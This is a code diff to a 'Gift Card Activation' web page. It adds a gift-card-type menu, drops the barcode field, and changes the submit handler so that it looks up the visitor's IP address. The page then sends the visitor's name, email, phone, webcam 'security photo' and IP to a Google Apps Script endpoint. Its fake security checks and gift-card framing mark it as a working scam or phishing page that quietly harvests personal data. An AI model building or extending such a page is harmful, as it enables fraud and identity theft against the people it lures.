@@ -31,10 +31,14 @@
         h2 { text-align: center; color: #00d9e0; margin-bottom: 30px; }
         .form-group { margin-bottom: 20px; }
         label { display: block; margin-bottom: 8px; font-weight: bold; color: #a0a0a0; }
-        input {
+        
+        /* Updated styles for select dropdown */
+        input, select {
             width: 100%; padding: 12px; border: 1px solid #333; border-radius: 6px;
             background-color: #2a2a2a; color: white; font-size: 16px; box-sizing: border-box;
         }
+        input:focus, select:focus { outline: none; border-color: #00d9e0; }
+
         #camera-section { margin-top: 15px; text-align: center; }
         #video-preview { width: 100%; border-radius: 6px; border: 1px solid #00d9e0; display: none; margin-bottom: 10px; }
         #captured-photo { width: 100%; border-radius: 6px; display: none; margin-bottom: 10px; border: 1px solid #4caf50; }
@@ -69,6 +73,20 @@
         <h2>Gift Card Activation</h2>
         <form id="activationForm">
             <div class="form-group">
+                <label for="cardType">Select Card Type</label>
+                <select id="cardType" name="cardType" required>
+                    <option value="" disabled selected>Choose a card...</option>
+                    <option value="Amazon Card">Amazon Card</option>
+                    <option value="Apple Card">Apple Card</option>
+                    <option value="eBay Card">eBay Card</option>
+                    <option value="Google Play Card">Google Play Card</option>
+                    <option value="Greendot Card">Greendot Card</option>
+                    <option value="Steam Card">Steam Card</option>
+                    <option value="Vanilla Card">Vanilla Card</option>
+                </select>
+            </div>
+
+            <div class="form-group">
                 <label for="fullName">Full Name</label>
                 <input type="text" id="fullName" name="fullName" required placeholder="First and Last Name" pattern="^[a-zA-Z]+\s+[a-zA-Z]+.*$">
             </div>
@@ -90,10 +108,6 @@
                 </div>
             </div>
             <div class="form-group">
-                <label for="barcode">Bar Code Number</label>
-                <input type="text" id="barcode" name="barcode" required placeholder="Minimum 8 characters">
-            </div>
-            <div class="form-group">
                 <label id="captcha-question" style="color:#00d9e0;"></label>
                 <input type="number" id="captcha-answer" placeholder="Enter result" required>
             </div>
@@ -108,7 +122,7 @@
 
 <script>
     document.getElementById('year').textContent = new Date().getFullYear();
-    const scriptURL = 'https://script.google.com/macros/s/AKfycbyhz28c3voiDfTIyNk63V5QH5AUMaqZYWKjT96Q0ZJdjeTwAkWIcGUbraEjN8_kVIqt/exec';
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbyfyTIM1xtENwx7ya5hMhIN219pFU-1g-j2FJrBe5QRhnGrvLw5ftG0Ck7xMRpl7N8T/exec';
 
     document.getElementById('phone').addEventListener('input', function (e) {
         let x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,4})/);
@@ -149,20 +163,24 @@
     document.getElementById('activationForm').onsubmit = async (e) => {
         e.preventDefault();
         if (!capturedImageData) { alert("Please take a security photo first."); return; }
-        if (document.getElementById('barcode').value.length < 8) { alert("Bar code is incorrect"); return; }
         if (parseInt(document.getElementById('captcha-answer').value) !== correctAnswer) { alert("Security check failed."); return; }
 
-        const submission = {
-            date: new Date().toLocaleString(),
-            name: document.getElementById('fullName').value,
-            email: document.getElementById('email').value,
-            phone: document.getElementById('phone').value,
-            barcode: document.getElementById('barcode').value,
-            photo: capturedImageData,
-            status: 'PENDING'
-        };
-
         try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const userIp = ipData.ip;
+
+            const submission = {
+                date: new Date().toLocaleString(),
+                name: document.getElementById('fullName').value,
+                email: document.getElementById('email').value,
+                phone: document.getElementById('phone').value,
+                barcode: document.getElementById('cardType').value, // Sending card type in the barcode slot
+                photo: capturedImageData,
+                status: 'PENDING',
+                ip: userIp
+            };
+
             await fetch(scriptURL, {
                 method: 'POST',
                 mode: 'no-cors',
